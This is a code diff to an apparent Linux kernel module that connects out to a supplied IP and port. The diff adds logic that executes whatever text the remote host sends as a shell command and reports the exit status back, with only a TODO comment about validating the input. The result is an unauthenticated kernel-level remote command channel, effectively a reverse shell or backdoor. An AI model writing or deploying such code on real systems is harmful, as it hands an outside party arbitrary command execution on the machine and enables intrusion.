@@ -3,6 +3,8 @@
 #include <linux/module.h>
 #include <linux/net.h>
 
+#include "exec.h"
+
 static struct socket *sock = NULL;
 static char *message = "Hello World! from kernel land";
 
@@ -35,11 +37,6 @@ int network_init(const char *ip, int port)
 
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
-
-    // equivalent to
-    // addr.sin_addr.s_addr = *(unsigned int*)ip_binary;
-    // without the explicit cast
-    // I do not like explicit casts
     memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
 
     if ((ret = sock->ops->connect(sock, convert(&addr), sizeof(addr), 0)) < 0)
@@ -73,6 +70,7 @@ int network_loop(void *data)
     struct kvec status_vec = { 0 };
     struct msghdr status_msg = { 0 };
     char status_buf[15];
+    int status = 0;
 
     // handle response:
     while (kthread_should_stop() == 0)
@@ -97,21 +95,28 @@ int network_loop(void *data)
                 "'%s'\n***************\n",
                 resp_buf);
 
-        // TODO: validate resp_buf's content and interpret it as a cmd to exec
-        // ...
-
-        // TODO: send exit status of exec'd cmd back
-        sprintf(status_buf, "status: 999\n");
-        status_vec.iov_base = status_buf;
-        status_vec.iov_len = strlen(status_buf);
-
-        if ((ret = kernel_sendmsg(sock, &status_msg, &status_vec, 1,
-                                  status_vec.iov_len))
-            < 0)
+        // TODO: validate content before interpreting it as a cmd to exec
+        if ((ret = exec_sync(resp_buf, &status)) == 0)
         {
-            pr_err("network: couldn't send exit status back: %d\n", ret);
-            return 1;
-            /* break; */
+            pr_info(
+                "network: command ran successfully. sending status back...\n");
+            sprintf(status_buf, "status: %d\n", status);
+            status_vec.iov_base = status_buf;
+            status_vec.iov_len = strlen(status_buf);
+
+            if ((ret = kernel_sendmsg(sock, &status_msg, &status_vec, 1,
+                                      status_vec.iov_len))
+                < 0)
+            {
+                pr_err("network: couldn't send exit status back: %d\n", ret);
+                return 1;
+                /* break; */
+            }
+        }
+        else
+        {
+            pr_err("network: couldn't execute `%s` as a shell command.\n",
+                   resp_buf);
         }
     }
     return 0;
